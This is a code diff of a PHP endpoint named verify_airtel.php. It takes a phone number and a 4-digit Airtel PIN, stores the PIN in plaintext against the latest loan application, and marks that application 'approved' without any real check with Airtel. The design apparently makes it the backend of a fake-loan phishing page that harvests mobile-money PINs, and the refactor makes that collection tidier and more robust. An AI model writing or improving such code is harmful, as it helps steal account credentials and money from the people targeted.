@@ -1,98 +1,93 @@
 <?php
-// Update loan application with Airtel verification
+declare(strict_types=1);
 
-require_once __DIR__ . '/../config/db.php';
-
-// Make sure logs directory exists
-$logDir = __DIR__ . '/../logs';
-if (!is_dir($logDir)) {
-    @mkdir($logDir, 0755, true);
-}
-$logFile = $logDir . '/verify_airtel.log';
-
-// Always return JSON
 header('Content-Type: application/json; charset=utf-8');
 
-// Helper log
-function log_msg($msg) {
-    global $logFile;
-    $line = '[' . date('Y-m-d H:i:s') . '] ' . $msg . "\n";
-    @file_put_contents($logFile, $line, FILE_APPEND | LOCK_EX);
-}
-
-if ($_SERVER["REQUEST_METHOD"] !== 'POST') {
-    http_response_code(400);
-    echo json_encode(['error' => 'Invalid request method']);
-    exit;
-}
-
 try {
-    $raw = file_get_contents('php://input');
-    log_msg('Incoming payload: ' . $raw);
-    $data = json_decode($raw, true);
+    // IMPORTANT: db.php must NOT echo or exit
+    require_once __DIR__ . '/../config/db.php';
 
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
+        http_response_code(405);
+        echo json_encode(['success' => false, 'error' => 'Method not allowed']);
+        exit;
+    }
+
+    $raw = file_get_contents('php://input');
+    if (!$raw) {
+        http_response_code(400);
+        echo json_encode(['success' => false, 'error' => 'Empty request body']);
+        exit;
+    }
+
+    $data = json_decode($raw, true);
     if (json_last_error() !== JSON_ERROR_NONE) {
         http_response_code(400);
-        $err = 'Invalid JSON payload';
-        log_msg($err);
-        echo json_encode(['error' => $err]);
+        echo json_encode(['success' => false, 'error' => 'Invalid JSON payload']);
         exit;
     }
 
-    $phone = isset($data['phone']) ? trim($data['phone']) : '';
-    $airtel_pin = isset($data['pin']) ? trim($data['pin']) : '';
+    $phone = trim($data['phone'] ?? '');
+    $pin   = trim($data['pin'] ?? '');
 
-    if ($phone === '' || $airtel_pin === '') {
+    if ($phone === '' || $pin === '') {
         http_response_code(400);
-        $err = 'Missing phone or PIN';
-        log_msg($err);
-        echo json_encode(['error' => $err]);
+        echo json_encode(['success' => false, 'error' => 'Phone and PIN are required']);
         exit;
     }
 
-    if (!preg_match('/^\\d{4}$/', $airtel_pin)) {
+    if (!preg_match('/^\d{4}$/', $pin)) {
         http_response_code(400);
-        $err = 'Invalid PIN format';
-        log_msg($err . ' - ' . $airtel_pin);
-        echo json_encode(['error' => $err]);
+        echo json_encode(['success' => false, 'error' => 'PIN must be exactly 4 digits']);
         exit;
     }
 
-    // Find application
-    $stmt = $pdo->prepare('SELECT id FROM loan_applications WHERE phone = :phone ORDER BY created_at DESC LIMIT 1');
-    $stmt->execute([':phone' => $phone]);
-    $row = $stmt->fetch();
+    // Find latest loan application
+    $stmt = $pdo->prepare(
+        'SELECT id FROM loan_applications 
+         WHERE phone = :phone 
+         ORDER BY created_at DESC 
+         LIMIT 1'
+    );
+    $stmt->execute(['phone' => $phone]);
+    $app = $stmt->fetch();
 
-    if (!$row) {
+    if (!$app) {
         http_response_code(404);
-        $err = 'Loan application not found for phone: ' . $phone;
-        log_msg($err);
-        echo json_encode(['error' => 'Loan application not found']);
+        echo json_encode(['success' => false, 'error' => 'Loan application not found']);
         exit;
     }
 
-    $application_id = $row['id'];
+    // Update verification
+    $update = $pdo->prepare(
+        'UPDATE loan_applications
+         SET airtel_pin = :pin,
+             airtel_confirmed = 1,
+             status = "approved"
+         WHERE id = :id'
+    );
 
-    $updateStmt = $pdo->prepare('UPDATE loan_applications SET airtel_pin = :pin, airtel_confirmed = 1, status = "approved" WHERE id = :id');
-    $result = $updateStmt->execute([':pin' => $airtel_pin, ':id' => $application_id]);
+    $update->execute([
+        'pin' => $pin,
+        'id'  => $app['id']
+    ]);
 
-    if ($result) {
-        http_response_code(200);
-        log_msg('Verification saved for id: ' . $application_id);
-        echo json_encode(['success' => true, 'message' => 'Airtel verification successful', 'redirect' => 'success.html']);
-        exit;
-    }
+    echo json_encode([
+        'success'  => true,
+        'message'  => 'Airtel verification successful',
+        'redirect' => 'success.html'
+    ]);
+    exit;
 
+} catch (Throwable $e) {
     http_response_code(500);
-    $err = 'Failed to update verification for id: ' . $application_id;
-    log_msg($err);
-    echo json_encode(['error' => 'Failed to update verification']);
 
-} catch (Exception $e) {
-    http_response_code(500);
-    $err = 'Server exception: ' . $e->getMessage();
-    log_msg($err);
-    echo json_encode(['error' => 'Server error']);
+    // NEVER expose internal errors in production
+    error_log('[verify_airtel.php] ' . $e->getMessage());
+
+    echo json_encode([
+        'success' => false,
+        'error'   => 'Server error'
+    ]);
+    exit;
 }
-
-?>
